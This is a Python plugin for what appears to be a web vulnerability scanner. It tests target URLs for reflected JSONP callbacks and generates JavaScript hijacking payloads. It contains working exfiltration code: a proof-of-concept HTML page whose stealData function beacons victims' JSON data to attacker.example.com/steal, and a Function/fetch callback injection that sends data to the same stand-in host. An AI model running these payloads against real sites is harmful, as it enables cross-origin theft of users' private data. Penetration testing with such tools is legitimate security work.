"""
JavaScript Hijacking / JSONP Exploit Plugin

Provides exploit capabilities for JavaScript hijacking and JSONP data exposure:
- JSONP callback injection
- JSON array hijacking PoC generation
- Cross-origin data theft demonstration
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)


class JSHijackingPlugin(ExploitPlugin):
    """JavaScript Hijacking / JSONP exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'js_hijacking'

    @property
    def name(self) -> str:
        return 'JavaScript Hijacking / JSONP Exploit'

    @property
    def description(self) -> str:
        return 'Exploits JavaScript hijacking and JSONP data exposure vulnerabilities.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate JSONP hijacking payloads."""
        context = context or {}
        callback = context.get('callback_param', 'callback')
        attacker_url = context.get('attacker_url', 'https://attacker.example.com/steal')

        payloads = [
            f'?{callback}=alert',
            f'?{callback}=console.log',
            f'?{callback}=eval',
            f'?{callback}=stealData',
            f'?{callback}=Function("fetch(\'{attacker_url}?d=\"+JSON.stringify(arguments[0]))")()',
            # JSONP PoC HTML
            self._generate_poc_html(attacker_url, callback),
        ]
        return payloads

    def _generate_poc_html(self, attacker_url: str, callback: str) -> str:
        return f'''<html>
<body>
<h2>JSONP Hijacking PoC</h2>
<script>
function stealData(data) {{
  var img = new Image();
  img.src = '{attacker_url}?data=' + encodeURIComponent(JSON.stringify(data));
}}
</script>
<script src="TARGET_URL?{callback}=stealData"></script>
</body>
</html>'''

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Test for JSONP endpoint and generate PoC."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'js_hijacking',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        callback_params = ['callback', 'jsonp', 'cb', 'jsoncallback', 'json_callback', 'call']

        for param in callback_params:
            try:
                test_value = 'megido_test_callback'
                url = f"{target_url}{'&' if '?' in target_url else '?'}{param}={test_value}"
                resp = requests.get(url, timeout=timeout, verify=verify_ssl)
                if test_value in resp.text:
                    poc_html = self._generate_poc_html(
                        'https://attacker.example.com/steal', param
                    ).replace('TARGET_URL', target_url)
                    return {
                        'success': True,
                        'vulnerability_type': 'js_hijacking',
                        'evidence': f'JSONP callback reflected via parameter "{param}"',
                        'parameter': param,
                        'poc_html': poc_html,
                        'message': 'JSONP hijacking confirmed',
                    }
            except Exception as e:
                logger.debug(f"Error testing JSONP param {param}: {e}")

        return {
            'success': False,
            'error': 'No exploitable JSONP endpoint found',
            'vulnerability_type': 'js_hijacking',
        }
